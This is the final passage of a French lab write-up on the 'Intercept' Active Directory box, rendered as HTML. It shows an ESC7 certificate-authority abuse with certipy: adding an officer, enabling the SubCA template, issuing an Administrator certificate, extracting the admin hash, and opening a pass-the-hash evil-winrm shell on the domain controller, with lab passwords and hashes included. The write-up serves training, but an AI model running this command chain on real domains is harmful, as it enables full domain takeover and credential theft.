+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span> <span class="nx">added</span> <span class="nx">to</span> <span class="nx">CA</span><span class="o">-</span><span class="nx">MANAGERS</span></span></span></code></pre></div></div>
+<h2 id="esc7">ESC7</h2>
+<p>Étant membre de ce groupe, il peut maintenant énumérer et gérer tous les certificats. J&rsquo;utilise donc <code>certipy</code> pour lister les certificats vulnérables. L&rsquo;autorité de certificat est vulnérable à une <strong>ESC7</strong>.
+Une <strong>ESC7</strong> apparaît quand un utilisateur ou groupe <strong>a trop de permissions sur l’Autorité de Certification (CA)</strong>. Ces droits permettent potentiellement de <strong>délivrer des certificats pour n’importe quel utilisateur</strong>, y compris un <strong>administrateur du domaine</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="o">-</span><span class="nx">debug</span> <span class="nx">find</span> <span class="o">-</span><span class="nx">target</span> <span class="nx">DC01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span><span class="err">@</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="o">-</span><span class="nx">stdout</span> <span class="o">-</span><span class="nx">vulnerable</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-20.png"
+        data-srcset="/images/Intercept/Intercept-20.png, /images/Intercept/Intercept-20.png 1.5x, /images/Intercept/Intercept-20.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-20.png"
+        title="/images/Intercept/Intercept-20.png" width="1010" height="871" /></p>
+<p>Pour approuver les certificats, on peut je m&rsquo;ajoute comme <strong>officer</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="nx">ca</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span><span class="err">@</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="o">-</span><span class="nx">ns</span> <span class="s1">&#39;10.13.38.49&#39;</span> <span class="o">-</span><span class="nx">target</span> <span class="s1">&#39;DC01.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">ca</span> <span class="s1">&#39;intercept-DC01-CA&#39;</span> <span class="o">-</span><span class="nx">add</span><span class="o">-</span><span class="nx">officer</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-21.png"
+        data-srcset="/images/Intercept/Intercept-21.png, /images/Intercept/Intercept-21.png 1.5x, /images/Intercept/Intercept-21.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-21.png"
+        title="/images/Intercept/Intercept-21.png" width="1720" height="166" /></p>
+<p>Je m&rsquo;assure que le template <strong><code>SubCA</code></strong> est activé sur le CA.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="nx">ca</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span><span class="err">@</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="o">-</span><span class="nx">ns</span> <span class="s1">&#39;10.13.38.49&#39;</span> <span class="o">-</span><span class="nx">target</span> <span class="s1">&#39;DC01.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">ca</span> <span class="s1">&#39;intercept-DC01-CA&#39;</span> <span class="o">-</span><span class="nx">enable</span><span class="o">-</span><span class="nx">template</span> <span class="s1">&#39;SubCA&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-22.png"
+        data-srcset="/images/Intercept/Intercept-22.png, /images/Intercept/Intercept-22.png 1.5x, /images/Intercept/Intercept-22.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-22.png"
+        title="/images/Intercept/Intercept-22.png" width="1720" height="160" /></p>
+<p>Je fais ensuite une demande de certificat <strong><code>SubCA</code></strong> pour <strong>Administrator</strong>. Parce que <code>Simon.Bowel</code> n&rsquo;a pas <strong>le droit d’enrollment direct</strong>, la requête est refusée, mais un identifiant de requête est généré. La clé privée associée de la CSR doit être enregistrée.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="nx">req</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span><span class="err">@</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="o">-</span><span class="nx">ns</span> <span class="s1">&#39;10.13.38.49&#39;</span> <span class="o">-</span><span class="nx">target</span> <span class="s1">&#39;DC01.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">ca</span> <span class="s1">&#39;intercept-DC01-CA&#39;</span> <span class="o">-</span><span class="nx">template</span> <span class="s1">&#39;SubCA&#39;</span> <span class="o">-</span><span class="nx">upn</span> <span class="s1">&#39;administrator@intercept.vl&#39;</span> <span class="o">-</span><span class="nx">sid</span> <span class="s1">&#39;S-1-5-21-3031021547-1480128195-3014128932-500&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-23.png"
+        data-srcset="/images/Intercept/Intercept-23.png, /images/Intercept/Intercept-23.png 1.5x, /images/Intercept/Intercept-23.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-23.png"
+        title="/images/Intercept/Intercept-23.png" width="1006" height="245" /></p>
+<p>Mais grâce au rôle <strong>Certificate Officer</strong> qu&rsquo;on s&rsquo;est attribué, <code>Simon.Bowel</code> peut approuver la demande. Le certificat est alors généré.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="nx">ca</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span><span class="err">@</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="o">-</span><span class="nx">ns</span> <span class="s1">&#39;10.13.38.49&#39;</span> <span class="o">-</span><span class="nx">target</span> <span class="s1">&#39;DC01.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">ca</span> <span class="s1">&#39;intercept-DC01-CA&#39;</span> <span class="o">-</span><span class="nx">issue</span><span class="o">-</span><span class="nx">request</span> <span class="s1">&#39;17&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-24.png"
+        data-srcset="/images/Intercept/Intercept-24.png, /images/Intercept/Intercept-24.png 1.5x, /images/Intercept/Intercept-24.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-24.png"
+        title="/images/Intercept/Intercept-24.png" width="1675" height="158" /></p>
+<p>Je peux récupérer le certificat désormais approuvé, en utilisant l&rsquo;ID de la requête et la clé privée enregistrée à l&rsquo;étape précédente. Je possède désormais le certificat <strong><code>administrator.pfx</code></strong>, associé au compte Administrator.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="nx">req</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span><span class="err">@</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="o">-</span><span class="nx">ns</span> <span class="s1">&#39;10.13.38.49&#39;</span> <span class="o">-</span><span class="nx">target</span> <span class="s1">&#39;DC01.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">ca</span> <span class="s1">&#39;intercept-DC01-CA&#39;</span> <span class="o">-</span><span class="nx">retrieve</span> <span class="s1">&#39;17&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-25.png"
+        data-srcset="/images/Intercept/Intercept-25.png, /images/Intercept/Intercept-25.png 1.5x, /images/Intercept/Intercept-25.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-25.png"
+        title="/images/Intercept/Intercept-25.png" width="888" height="220" /></p>
+<p>J&rsquo;utilise la commande suivante pour s&rsquo;authentifier et obtenir un accès privilégié. Je récupère alors le hash de l&rsquo;utilisateur <code>Administrator</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">certipy</span> <span class="nx">auth</span> <span class="o">-</span><span class="nx">pfx</span> <span class="nx">administrator</span><span class="p">.</span><span class="nx">pfx</span> <span class="o">-</span><span class="nx">username</span> <span class="nx">administrator</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-26.png"
+        data-srcset="/images/Intercept/Intercept-26.png, /images/Intercept/Intercept-26.png 1.5x, /images/Intercept/Intercept-26.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-26.png"
+        title="/images/Intercept/Intercept-26.png" width="1267" height="311" /></p>
+<h2 id="shell-on-dc01">Shell on DC01</h2>
+<p>Je me connecte en tant qu&rsquo;administrateur du domaine et je peux récupérer le flag <code>Relayed</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">evil</span><span class="o">-</span><span class="nx">winrm</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Administrator</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">ad95c338a6cc5729ae7390acbe0ca91f</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">dc01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-27.png"
+        data-srcset="/images/Intercept/Intercept-27.png, /images/Intercept/Intercept-27.png 1.5x, /images/Intercept/Intercept-27.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-27.png"
+        title="/images/Intercept/Intercept-27.png" width="825" height="366" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2026-03-14</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/intercept/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/intercept/" data-title="Intercept" data-via="z3rodol" data-hashtags="Hard,Windows,Active Directory,NTLM Relay,ESC7,LLMNR Poisonning"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/hard/">Hard</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/ntlm-relay/">NTLM Relay</a>,&nbsp;<a href="/tags/esc7/">ESC7</a>,&nbsp;<a href="/tags/llmnr-poisonning/">LLMNR Poisonning</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/babytwo/" class="prev" rel="prev" title="BabyTwo"><i class="fas fa-angle-left" aria-hidden="true"></i>BabyTwo</a>
+            <a href="/vulnescape/" class="next" rel="next" title="VulnEscape">VulnEscape<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
